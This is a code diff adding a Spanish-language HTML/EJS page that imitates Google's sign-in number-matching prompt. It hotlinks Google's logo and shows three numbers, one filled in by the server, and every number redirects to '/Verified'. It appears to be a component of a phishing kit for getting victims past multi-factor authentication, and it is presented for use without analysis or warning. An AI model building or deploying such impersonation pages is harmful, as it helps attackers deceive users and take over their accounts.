@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Número</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+
+        img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .circle-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .circle {
+            width: 100px;
+            height: 100px;
+            background-color: #4285F4;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .circle:hover {
+            background-color: #357ae8;
+        }
+
+        .circle:nth-child(2) {
+            background-color: #4285F4;
+        }
+
+        .circle:nth-child(2):hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
+        <h1>Selecciona el número que se ha enviado a tu correo</h1>
+        <div class="circle-container">
+            <div class="circle" onclick="redirectToThanks()">6</div>
+            <div class="circle" onclick="redirectToThanks()"><%= number %></div>
+            <div class="circle" onclick="redirectToThanks()">33</div>
+        </div>
+    </div>
+
+    <script>
+        function redirectToThanks() {
+            window.location.href = '/Verified';
+        }
+    </script>
+</body>
+
+</html>
